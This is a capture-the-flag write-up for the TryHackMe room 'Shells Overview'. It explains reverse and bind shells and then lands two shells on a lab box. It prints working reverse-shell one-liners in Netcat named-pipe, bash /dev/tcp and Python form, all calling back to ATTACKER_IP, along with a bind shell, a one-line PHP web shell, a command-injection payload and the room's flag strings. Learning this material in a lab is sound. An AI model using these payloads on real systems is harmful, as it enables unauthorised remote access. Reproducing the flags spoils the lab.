---
title: 'Shells Overview'
target: 'TryHackMe — Shells Overview'
difficulty: 'easy'
date: 2026-08-26
summary: 'Reverse vs bind shells, the Netcat payloads for each, the tooling that makes a raw shell usable, and a practical finish exploiting command injection and an unrestricted file upload to land two shells.'
role: 'pentest'
tags: ['Reverse shell', 'Bind shell', 'Netcat', 'Web shell', 'Command injection', 'File upload']
problem: 'A shell is the goal of most of the offensive chain, but "get a shell" hides a lot: which direction it connects, what payload fits the target, and how to make a raw one usable once you have it.'
action: 'Worked through reverse and bind shells with Netcat, the payloads across Bash, PHP and Python, then landed two shells on the target box via command injection and an unrestricted file upload.'
outcome: 'Two flags, one through an injected reverse shell and one through an uploaded PHP web shell.'
---

Almost everything in offensive security ends in the same place: a shell on the
target. This room is the anatomy of that — the difference between the target
calling you and you calling the target, the payloads that fit different
environments, and the practical part where you actually land one. It stays
manual throughout: no Metasploit, which is the right way to learn this, because
the automation hides exactly the mechanics worth understanding.

## Shells and what they're for

A shell is the command-line interface between a user and the operating system.
In an offensive context it's the session you establish on a compromised host to
run commands remotely.

That access is a launch point, not an end state. From a shell an attacker
escalates privileges, exfiltrates data, sets up persistence, and pivots — using
the compromised host as a foothold to reach machines that weren't exposed
directly.

- **The interface between a user and the OS:** shell
- **Using a compromised host to reach others on the network:** pivoting
- **A common next step after landing a shell:** privilege escalation

## Reverse shell

A reverse shell has the target connect back to you. That's the important
property: outbound connections usually pass a firewall that would have dropped
the same connection inbound, so a reverse shell sidesteps the restriction that
would stop a bind shell.

You set up the listener first, then trigger the payload on the target.

Listener on the attacking machine:

```bash
nc -lvnp 443
```

`-l` listen, `-v` verbose so you see the connection land, `-n` skip DNS, `-p 443`
the port. Port 443 is a deliberate choice — outbound HTTPS is allowed almost
everywhere, so a callback on 443 blends into normal egress.

Payload on the target:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f
```

This is the classic named-pipe reverse shell. `mkfifo /tmp/f` creates a pipe;
`cat` reads from it into an interactive shell; the shell's output — including
stderr, via `2>&1` — is piped to Netcat, which sends it to you and writes what
comes back into the pipe. The result is a working two-way channel out of tools
present on almost any Linux host.

- **Shell where the target connects back to the attacker:** reverse shell
- **Tool commonly used to set up the listener:** Netcat

## Bind shell

A bind shell is the reverse of that — the target opens a port and waits, and you
connect in.

Payload on the target:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Same pipe construction, but Netcat is now the one listening (`-l` on
`0.0.0.0:8080`).

Connect from the attacking machine:

```bash
nc -nv TARGET_IP 8080
```

Port 8080 is chosen on purpose. Binding a port below 1024 needs root, so an
unprivileged foothold has to listen high. That's also the bind shell's weakness:
the target holds a listening port open, which is far easier to spot than an
outbound connection, and a firewall that blocks inbound traffic kills it outright.
This is why reverse shells are the default in practice.

- **Shell that opens a port on the target for incoming connections:** bind shell
- **Listening below which port number needs root:** 1024

## Making a raw shell usable

A shell dropped through Netcat is raw — no history, no tab completion, no job
control, and Ctrl-C kills the whole thing. Three tools fix or extend that:

- **rlwrap** wraps a Netcat listener in readline, giving you history and line
  editing: `rlwrap nc -lvnp 443`.
- **Ncat**, from the Nmap project, is a modernised Netcat that can wrap the
  connection in SSL — an encrypted shell rather than cleartext on the wire.
- **Socat** handles arbitrary socket-to-socket channels and is the go-to for a
  fully interactive TTY upgrade.

Answers: socket connection between two data sources — **socat**; readline and
history for a listener — **rlwrap**; Nmap's SSL-capable Netcat — **ncat**.

## Payloads by environment

The shell you can land depends on what the target will run. The room covers three:

**Bash**, when you have command execution on a Linux host:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

`/dev/tcp` is a bash feature, not a real file — writing to it opens a socket. No
Netcat needed on the target at all.

**PHP**, when the target runs a PHP web app. PHP exposes command execution
through `exec`, `shell_exec`, `system`, `passthru` and `popen`, any of which can
kick off a reverse shell.

**Python**, common where Python is present:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

It opens a socket, duplicates it over stdin, stdout and stderr with `dup2`, then
execs a shell across it.

Answers: Python module for managing shell commands — **subprocess**; the language
using `exec`/`shell_exec`/`system`/`passthru`/`popen` — **PHP**; language using a
socket plus duplicated file descriptors — **Python**.

## Web shells

A web shell is a script uploaded to a web server that runs OS commands from HTTP
requests. The minimal PHP version is one line:

```php
<?php system($_GET['cmd']); ?>
```

Save it as `shell.php`, get it onto the server, and every request runs a command:

```
http://TARGET/uploads/shell.php?cmd=whoami
http://TARGET/uploads/shell.php?cmd=cat%20/flag.txt
```

The usual way it gets there is **unrestricted file upload** — an upload form that
doesn't check file type, so a `.php` goes up where only an image was expected.
Bigger web shells like p0wny-shell or b374k add a file-manager UI, but the
one-liner is enough to prove the point.

Answers: the vulnerability type — **unrestricted file upload**; the uploaded
script itself — **web shell**.

## Practical: two shells, two flags

The room ends with a box exposing both vulnerabilities.

**Command injection → reverse shell.**

Listener up first:

```bash
nc -lvnp 443
```

Then feed the reverse-shell payload through the injection point — the vulnerable
field passes input to a system call unsanitised, so appending a command runs it:

```
; bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

The listener catches the callback and you're on the box. Read the flag:

```bash
cat /flag.txt
```

Flag: `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`

**Unrestricted file upload → web shell.**

Upload the one-line PHP shell — the form doesn't validate type, so `shell.php`
lands. Find where it was written (commonly an `/uploads/` path) and drive it
through the `cmd` parameter:

```
http://TARGET/uploads/shell.php?cmd=cat%20/flag.txt
```

Flag: `THM{202bb14ed12120b31300cfbbbdd35998786b44e5}`

## What I took from this

Two things stuck. First, reverse vs bind is really a question about the firewall,
not the shell — the target can almost always get a packet *out* even when nothing
gets *in*, which is why reverse shells win. Second, the named-pipe payloads look
like line noise until you trace the flow once: pipe in, shell in the middle,
Netcat out, output looped back to the pipe. After that they read like a sentence,
and you can reconstruct them from memory rather than copying them off a cheatsheet
mid-engagement.
